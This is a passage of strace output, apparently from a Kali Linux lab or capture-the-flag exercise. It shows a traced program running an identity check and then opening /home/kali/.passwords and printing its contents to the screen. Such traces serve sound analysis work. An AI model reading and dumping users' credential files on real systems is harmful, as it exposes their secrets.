[pid 669328] close(3)                   = 0
[pid 669328] newfstatat(AT_FDCWD, "/etc/nsswitch.conf", {st_mode=S_IFREG|0644, st_size=574, ...}, 0) = 0
[pid 669328] openat(AT_FDCWD, "/etc/group", O_RDONLY|O_CLOEXEC) = 3
[pid 669328] fstat(3, {st_mode=S_IFREG|0644, st_size=1331, ...}) = 0
[pid 669328] lseek(3, 0, SEEK_SET)      = 0
[pid 669328] read(3, "root:x:0:\ndaemon:x:1:\nbin:x:2:\ns"..., 4096) = 1331
[pid 669328] close(3)                   = 0
[pid 669328] newfstatat(AT_FDCWD, "/etc/nsswitch.conf", {st_mode=S_IFREG|0644, st_size=574, ...}, 0) = 0
[pid 669328] openat(AT_FDCWD, "/etc/group", O_RDONLY|O_CLOEXEC) = 3
[pid 669328] fstat(3, {st_mode=S_IFREG|0644, st_size=1331, ...}) = 0
[pid 669328] lseek(3, 0, SEEK_SET)      = 0
[pid 669328] read(3, "root:x:0:\ndaemon:x:1:\nbin:x:2:\ns"..., 4096) = 1331
[pid 669328] close(3)                   = 0
[pid 669328] write(1, "uid=1000(kali) gid=1000(kali) gr"..., 229 <unfinished ...>
[pid 669326] <... read resumed>"uid=1000(kali) gid=1000(kali) gr"..., 4096) = 229
[pid 669328] <... write resumed>)       = 229
[pid 669326] write(1, "[!] ID: kali\n", 13 <unfinished ...>
[pid 669328] close(1[!] ID: kali
 <unfinished ...>
[pid 669326] <... write resumed>)       = 13
[pid 669326] close(3 <unfinished ...>
[pid 669328] <... close resumed>)       = 0
[pid 669326] <... close resumed>)       = 0
[pid 669326] wait4(669327,  <unfinished ...>
[pid 669328] close(2)                   = 0
[pid 669328] exit_group(0)              = ?
[pid 669328] +++ exited with 0 +++
[pid 669327] <... wait4 resumed>[{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0, NULL) = 669328
[pid 669327] --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=669328, si_uid=1000, si_status=0, si_utime=0, si_stime=0} ---
[pid 669327] rt_sigreturn({mask=[]})    = 669328
[pid 669327] wait4(-1, 0x7fffa545d2cc, WNOHANG, NULL) = -1 ECHILD (No child processes)
[pid 669327] exit_group(0)              = ?
[pid 669327] +++ exited with 0 +++
<... wait4 resumed>[{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0, NULL) = 669327
--- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=669327, si_uid=1000, si_status=0, si_utime=0, si_stime=0} ---
openat(AT_FDCWD, "/home/kali/.passwords", O_RDONLY) = 3
fstat(3, {st_mode=S_IFREG|0664, st_size=11, ...}) = 0
read(3, "lost\nhello\n", 4096)          = 11
write(1, "lost\n", 5lost
)                   = 5
write(1, "hello\n", 6hello
)                  = 6
read(3, "", 4096)                       = 0
close(3)                                = 0
exit_group(0)                           = ?

```

